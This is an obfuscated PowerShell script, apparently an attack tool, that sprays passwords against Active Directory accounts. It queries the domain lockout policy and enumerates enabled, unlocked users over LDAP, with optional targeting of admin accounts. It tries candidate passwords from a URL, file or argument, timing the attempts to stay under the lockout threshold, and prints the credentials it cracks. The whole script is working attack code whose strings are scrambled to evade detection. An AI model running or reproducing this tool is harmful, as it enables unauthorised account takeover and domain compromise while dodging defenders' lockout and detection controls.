 $xcI= [tyPE]("{0}{1}{3}{2}"-f 'sY','Stem','nT32','.i') ;   sEt-iTeM vARiABle:9oM ( [TyPE]("{6}{8}{7}{3}{13}{2}{0}{5}{12}{9}{10}{1}{4}{11}"-F'c','y.dOm','torySErvi','M.Dire','AI','Es.AcT','Sy','TE','s','R','ectOr','N','IVEdi','C') )  ;$BO62=  [Type]("{0}{1}{3}{2}" -F'ENVI','RO','Nt','nmE') ;  $tcP =  [tyPe]("{1}{0}"-F'eTIMe','Dat')  ;

[CmdletBinding(defauLtpaRaMeteRSETNAme={"{0}{1}"-f 'ByPas','s'})]
Param 
(
    [Parameter(MaNdaToRy = $true, pArameTerSeTNaME = "b`YUrL",HelPmESsage={"{27}{19}{4}{18}{0}{28}{11}{31}{22}{2}{15}{1}{13}{17}{8}{29}{16}{7}{30}{3}{14}{21}{24}{10}{25}{9}{26}{5}{23}{12}{6}{20}" -f'om','wo',' ','mu','f','h targ','ser acc','s','e','rds',' pa','given URL an','ted u','rd inpu','l','as pass',' te','t fil','ile fr','nload ','ount.','t','se','e','iple','sswo',' for eac','Dow',' ',' to','t ','d u'})]
    [String]
    $Url = '',

    [Parameter(MaNdatOry = $true, PArAMeteRseTnAme = "ByF`i`lE",HELPMESsAgE={"{12}{10}{3}{17}{7}{18}{21}{5}{8}{1}{6}{22}{19}{14}{11}{0}{15}{9}{2}{13}{16}{4}{20}"-f'st ','or','pa',' a','ted user','to a p','d input f','a','assw','tiple ','pply','te','Su','sswor',' ','mul','ds for each targe',' p','t','le to',' account.','h ','i'})]
    [String]
    $File = '',

    [Parameter(MAnDATory = $true, paRamETersEtNAME = "B`YPAsS",heLPmeSsaGe={(("{32}{18}{8}{30}{6}{31}{22}{29}{19}{12}{27}{20}{7}{25}{13}{28}{1}{5}{3}{10}{4}{9}{15}{21}{2}{11}{14}{16}{17}{23}{24}{26}{0}"-f'sword2{0}','ac','t. Eg.','arge','s','h t','g','est','ify a','er acc','ted u',' ',' p','r','-P','o','ass {0}Pass','w','c','tiple','words to t','un','e','ord1,','Pa',' fo','s','ass',' e',' or mul',' sin','l','Spe'))  -f[CHar]39})]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(mAnDATOrY = $false,HeLPMEsSaGe={("{4}{9}{6}{13}{3}{8}{5}{11}{2}{10}{7}{1}{12}{0}" -f ')','u','s ','rget ','Warn','leged user ac',' will ','minco','privi','ing:','(ad','count','nt=1.','also ta')})]
    [Switch]
    $Admins = $false

)


Function isNumeric ($x) {
    $x2 = 0
    $isNum =   (  VArIable ('x'+'Ci') -VALue)::"Try`P`ArSe"($x, [ref]$x2)
    Return $isNum
}


Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].("{0}{1}" -f 'Spli','t').Invoke(":")[1].("{0}{1}" -f 'T','rim').Invoke()

    If (isNumeric($threshold) )
        {
            Write-Verbose ('t'+'hre'+'shold '+'i'+'s '+'a '+'numb'+'e'+'r '+'= '+"$threshold")
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose ((("{1}{7}{2}{10}{11}{9}{5}{4}{8}{0}{3}{6}" -f' m','Thr','hol','ax t','everHfV, settin','y HfVN','o 1000...','es','g','bl','d is prob','a'))."Re`pLaCE"('HfV',[stRINg][cHAr]39))
            $threshold = [Int]1000
        }
    
    Return $threshold
}


Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].("{0}{1}"-f 'S','plit').Invoke(":")[1].("{1}{0}" -f'rim','T').Invoke()
    Write-Verbose ('Lock'+'out'+' '+'du'+'ratio'+'n '+'i'+'s '+'= '+"$duration")
    Return $duration
}


Function Get-UserObjects
{
    
    Try {$domainObj =   (chiLdItem  VarIabLe:9OM  ).VaLUe::("{0}{1}{2}"-f'GetCurrentDoma','i','n').Invoke()}
    Catch {Write-Verbose ("{2}{7}{1}{3}{6}{0}{4}{5}" -f 'quit',' fou','N','nd,','..','.',' will ','o domain') ; Exit}
   
    
    $PDC = ($domainObj."pd`CROLe`o`WnER")."N`Ame"

    
    $SearchString = ("{2}{0}{1}"-f'A','P://','LD')
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher."s`EaRchR`Oot" = $objDomain

    
    $Searcher."p`RO`P`ERtiESTolO`Ad".("{1}{0}" -f'dd','A').Invoke(("{1}{4}{2}{3}{0}" -f 'untname','s','cc','o','ama')) > $Null
    $Searcher."prope`RtIe`StoL`O`AD".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{3}{0}"-f'dcount','p','bad','w')) > $Null
    $Searcher."PRo`Pe`RtIesTo`lo`AD".("{0}{1}" -f 'A','dd').Invoke(("{2}{4}{1}{3}{0}"-f'me','sswor','bad','dti','pa')) > $Null

    
    If ($Admins) {$Searcher."fi`lT`er"=((("{4}{12}{14}{0}{8}{6}{9}{1}{2}{16}{11}{10}{7}{3}{5}{13}{15}" -f'o','y','pe=805306','rAccountContr','(','ol:1.2.840.','nt','se','u','T','(!(u','ockoutTime>=1))','&(sa','113556.','mAcc','1.4.803:=2)))','368)(!(l')))}
    Else {$Searcher."FI`LtER"=((("{1}{10}{28}{3}{11}{7}{8}{14}{19}{30}{25}{13}{20}{6}{18}{24}{17}{21}{0}{29}{2}{15}{27}{23}{22}{9}{26}{31}{4}{5}{12}{16}" -f'cc','(','untC','am','5','56.1.4.803:','!(lockoutTime>','countTyp','e=8','0.','&','Ac','=2))','unt=','0530636','ontrol:',')','(!(','=','8','1))(','userA','84','.','1))','nco','11','1.2','(s','o',')(!(admi','3')))}
    $Searcher."PA`gEsI`Ze" = 1000

    
    $userObjs = $Searcher.("{1}{0}" -f 'l','FindAl').Invoke()
    Return $userObjs
}


Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    
    $CurrentDomain = ("{0}{1}"-f'LDAP:/','/')+([ADSI]"")."DISTInGuI`sHe`dn`Ame"

    
    Write-Verbose ('Tryin'+'g '+'to'+' '+'authe'+'nt'+'ica'+'te '+'as'+' '+'u'+'ser '+"'$username' "+'wi'+'th '+'passwo'+'rd '+"'$password'")
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom."nA`Me"
    
    
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}


Function Parse-Url
{
    Param ([String]$url)

    
    $data = (New-Object System.Net.WebClient).("{0}{3}{2}{1}"-f'Do','ring','dSt','wnloa').Invoke($url)
    $data = $data."SP`Lit"(  (CHILDITEM  ("vARIablE:"+"B"+"o6"+"2")  ).VaLUE::"nE`wl`Ine")

    
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.("{1}{0}" -f 'plit','S').Invoke(",").("{0}{1}" -f 'T','rim').Invoke()
    Return $passwords
}


Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.("{0}{1}"-f 'Sp','lit').Invoke(",").("{1}{0}" -f'm','Tri').Invoke()
        Return $passwords
   }
   Else {Return $null}
}


Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users... "
   
   If ($passwords."L`engTh" -gt $threshold)
   {
        $time = ($passwords."le`N`gTH" - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes. "
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   
   For ($i = 0; $i -lt $userObj."l`eng`Th"; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   
   Write-Host ("{15}{5}{0}{7}{12}{16}{2}{4}{10}{8}{3}{11}{14}{13}{9}{1}{6}" -f ' b','..',' ','ss ','for','orming','.','r',' the proce','ts','ce - press [q] to stop','a','u',' resul','nd print','Perf','te') -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        
        $userObj = Get-UserObjects
        
        
        For ($i = 0; $i -lt $userObj."len`gTH"; $i += 1)
        {

            
            If ($Host."ui"."Ra`WUI"."Keya`VaIl`ABle" -and ("q" -eq $Host."Ui"."R`Awui".("{1}{0}{2}"-f 'e','ReadK','y').Invoke(("{1}{2}{0}{5}{4}{3}" -f 'deKeyUp,','In','clu','o','Ech','No'))."Ch`ARaCTeR"))
            {
                Write-Host ("{0}{2}{3}{5}{4}{1}{7}{6}"-f 'Sto','fo','p','pi',' brute','ng','e now....','rc') -Background DarkRed
                Break ("{1}{0}"-f'in','Ma')
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    
                    $samaccountnname = $userObj[$i]."p`ROpe`RtIes"."SA`mACCo`UnT`NAME"
                    $badpwdcount = $userObj[$i]."Pro`pE`RTIeS"."BA`dp`WDC`OUnT"[0]
                    $badpwdtime = $userObj[$i]."ProPE`R`TIes"."Ba`dpASswoRd`T`IME"[0]
                    
                    
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])' " -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords."L`ENg`Th") {$done[$i] = $true}
                        }
                    }

                    
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then =   ( CHILDITeM ("vArIAB"+"le:TC"+"P")  ).VaLUE::("{0}{2}{1}"-f'Fro','leTime','mFi').Invoke($badpwdtime)
                            $timediff = ($now - $then)."TOTAl`mIn`UTes"
                        
                            If ($timediff -gt $duration)
                            {
                                
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])' " -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords."LeNG`Th") {$done[$i] = $true}
                                }

                            } 

                        }
                        Else
                        {
                            
                            Write-Verbose ('- '+'n'+'o '+'b'+'a'+'d'+'pwdtime '+'except'+'io'+'n '+"'$samaccountnname':'$badpwdcount':'$badpwdtime'")
	
	
	
				   
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])' " -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords."lE`Ngth") {$done[$i] = $true}
                                }
			 
			 
			    
                        } 

                    } 

                } 

            } 

        } 

        
        $amount = 0
        For ($j = 0; $j -lt $done."le`NGth"; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done."L`E`NgTh") {Break}

   
   Start-Sleep -m 1000

   } 

   If ($results."lEn`GTH" -gt 0)
   {
       Write-Host ("{0}{1}{4}{5}{3}{2}" -f 'Use','rs gues','re:','a','sed',' ')
       For($i = 0; $i -lt $results."lenG`TH"; $i += 2) {Write-Host (" '$($results[$i])' with password: '$($results[$i + 1])' ")}
   }
   Else {Write-Host ("{5}{2}{4}{1}{6}{3}{0}"-f'ere guessed.','ords','o p','w','assw','N',' ')}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.("{1}{0}" -f 'lit','Sp').Invoke(",").("{0}{1}" -f'Tri','m').Invoke()   
}

If($passwords -eq $null)
{
    Write-Host ("{2}{8}{4}{3}{0}{1}{9}{10}{7}{6}{5}" -f 'rd inpu','t,','Error in ','wo','s','again.','y ','ase tr','pas',' pl','e')
    Exit
}


$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host ("{0}{5}{3}{6}{2}{4}{1}"-f'WARN','s.','geting ad','G: a','min account','IN','lso tar') -BackgroundColor DarkRed}


BruteForce $duration $threshold $passwords
